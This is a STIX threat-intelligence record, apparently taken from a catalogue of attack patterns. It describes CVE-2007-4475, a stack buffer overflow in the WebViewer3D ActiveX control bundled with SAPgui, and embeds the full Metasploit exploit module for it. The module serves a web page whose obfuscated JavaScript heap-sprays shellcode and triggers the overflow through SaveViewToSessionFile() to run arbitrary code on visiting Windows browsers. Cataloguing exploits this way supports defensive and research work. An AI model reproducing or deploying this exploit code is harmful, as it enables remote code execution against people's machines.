{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7e977ec2-0fcd-4b3f-a4a2-32054e10ae9b",
    "created": "2024-08-14T16:44:42.636198Z",
    "modified": "2024-08-14T16:44:42.636202Z",
    "name": "SAP AG SAPgui EAI WebViewer3D Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Siemens Unigraphics Solutions Teamcenter Visualization EAI WebViewer3D ActiveX control that is bundled with SAPgui. When passing an overly long string the SaveViewToSessionFile() method, arbitrary code may be executed.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/sapgui_saveviewtosessionfile.rb",
            "external_id": "sapgui_saveviewtosessionfile.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-4475"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SAP AG SAPgui EAI WebViewer3D Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Siemens Unigraphics Solutions\n        Teamcenter Visualization EAI WebViewer3D ActiveX control that is bundled\n        with SAPgui. When passing an overly long string the SaveViewToSessionFile()\n        method, arbitrary code may be executed.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-4475' ],\n          [ 'OSVDB', '53066' ],\n          [ 'US-CERT-VU','985449' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]\n        ],\n      'DisclosureDate' => '2009-03-31',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Create some nops.\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Set the return.\n    ret = Rex::Text.uri_encode(Metasm::Shellcode.assemble(Metasm::Ia32.new, \"or cl,[edx]\").encode_string * 2)\n\n    # Randomize the javascript variable names.\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)  + 2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    content = %Q|\n    <html>\n      <object id='#{vname}' classid='clsid:AFBBE070-7340-11D2-AA6B-00E02924C34E'></object>\n      <script language=\"JavaScript\">\n        var #{rand1} = unescape('#{shellcode}');\n        var #{randnop} = \"#{nops}\";\n        var #{rand2} = unescape(#{randnop});\n        var #{rand3} = 20;\n        var #{rand4} = #{rand3} + #{rand1}.length;\n        while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};\n        var #{rand5} = #{rand2}.substring(0,#{rand4});\n        var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});\n        while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};\n        var #{rand7} = new Array();\n        for (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }\n        var #{rand8} = \"\";\n        for (#{var_i} = 0; #{var_i} < 12500; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }\n        #{vname}.SaveViewToSessionFile(#{rand8});\n      </script>\n    </html>\n      |\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-03-31",
    "x_mitre_platforms": [
        "win'"
    ]
}